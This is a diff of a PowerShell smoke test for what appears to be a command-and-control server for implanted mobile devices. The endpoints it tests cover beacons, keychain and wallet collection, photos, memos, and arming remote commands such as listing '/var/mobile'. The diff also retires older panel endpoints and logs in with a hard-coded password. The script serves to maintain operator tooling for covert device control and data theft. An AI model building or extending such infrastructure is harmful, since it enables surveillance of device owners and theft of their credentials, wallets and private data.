@@ -53,45 +53,46 @@ $null = Probe GET "$Base/res/1/2" $null $null -Silent4xx
 $null = Probe POST "$Base/heartbeat" "heartbeat:pe_done" @{ "Content-Type" = "text/plain" }
 
 Write-Host "== 管理面（授权闭环）=="
-$s = Probe GET "$Base/admin"
+$s = Probe GET "$Base/admin/"
 Write-Host ("admin page         : " + $(if ($s -eq 200) { "PASS" } else { "FAIL" }))
 $null = Probe GET "$Base/__dash" $null $null -Expect401
-$null = Probe GET "$Base/__q/devices" $null $null -Expect401
-$null = Probe GET "$Base/panel/api/overview" $null $null -Expect401
+$null = Probe GET "$Base/__q/commands" $null $null -Expect401
+$null = Probe GET "$Base/panel/api/devices" $null $null -Expect401
 $s = Probe POST "$Base/__auth/login" '{"password":"lab888"}'
 Write-Host ("login              : " + $(if ($s -eq 200) { "PASS" } else { "FAIL" }))
+# ── 保留契约（Vue 控制台唯一数据源）──
 $null = Probe GET "$Base/__dash/api"
 $null = Probe GET "$Base/__dash/api?log_tail=10&acc_tail=5"
-$null = Probe GET "$Base/__q/devices"
-$null = Probe GET "$Base/__q/stats"
 $null = Probe GET "$Base/__q/commands"
-$null = Probe GET "$Base/__q/wallets"
-$null = Probe GET "$Base/__q/wallets_rules"
-$null = Probe GET "$Base/panel/api/overview"
+$null = Probe GET "$Base/__q/device_command_targets"
+$null = Probe GET "$Base/__q/device_commands?target=127.0.0.1"
 $null = Probe GET "$Base/panel/api/devices"
+$null = Probe GET "$Base/panel/api/progress"
 $null = Probe GET "$Base/panel/api/apps"
 $null = Probe GET "$Base/panel/api/war"
 $null = Probe GET "$Base/panel/api/notes"
-$null = Probe GET "$Base/panel/api/commands"
-$null = Probe GET "$Base/panel/api/access"
 $null = Probe GET "$Base/panel/api/visits"
+$null = Probe GET "$Base/panel/api/keychain/devices"
+$null = Probe GET "$Base/panel/api/results"
 $null = Probe GET "$Base/console"
 $null = Probe GET "$Base/api/stats"
-$null = Probe GET "$Base/api/list?type=visitor"
-$null = Probe GET "$Base/api/list?type=managed"
-$null = Probe GET "$Base/api/activity?limit=5"
-$null = Probe GET "$Base/api/tasks"
-$null = Probe GET "$Base/api/data/memos"
-$null = Probe GET "$Base/api/data/wallets"
 $null = Probe GET "$Base/api/data/photos"
 $null = Probe GET "$Base/__control"
 $s = Probe POST "$Base/__control" '{"type":"ls","params":{"path":"/var/mobile"},"once":true}'
 Write-Host ("arm command        : " + $(if ($s -eq 200) { "PASS" } else { "FAIL" }))
 $s = Probe POST "$Base/beacon" '{"uuid":"S","status":"idle"}'
 Write-Host ("beacon dispatch    : " + $(if ($s -eq 200) { "PASS" } else { "FAIL" }))
-$s = Probe POST "$Base/panel/api/commands" '{"type":"memo_scan","params":{},"once":true}'
-Write-Host ("panel arm command  : " + $(if ($s -eq 200) { "PASS" } else { "FAIL" }))
-$null = Probe POST "$Base/api/dispatch" '{"uuid":"SMOKE-0001","module":"basic_info"}'
+# ── 已下线端点应 4xx（前端全量迁移 Vue 后收敛，不再暴露）──
+$null = Probe GET "$Base/panel/api/overview" $null $null -Expect4xx
+$null = Probe GET "$Base/panel/api/access" $null $null -Expect4xx
+$null = Probe GET "$Base/panel/api/commands" $null $null -Expect4xx
+$null = Probe GET "$Base/__q/devices" $null $null -Expect4xx
+$null = Probe GET "$Base/__q/stats" $null $null -Expect4xx
+$null = Probe GET "$Base/__q/wallets" $null $null -Expect4xx
+$null = Probe GET "$Base/api/list?type=managed" $null $null -Expect4xx
+$null = Probe GET "$Base/api/activity?limit=5" $null $null -Expect4xx
+$null = Probe GET "$Base/api/data/memos" $null $null -Expect4xx
+$null = Probe POST "$Base/api/dispatch" '{"uuid":"SMOKE-0001","module":"basic_info"}' -Expect4xx
 $null = Probe POST "$Base/__auth/logout" "{}"
 $null = Probe GET "$Base/__dash/api" $null $null -Expect401
 
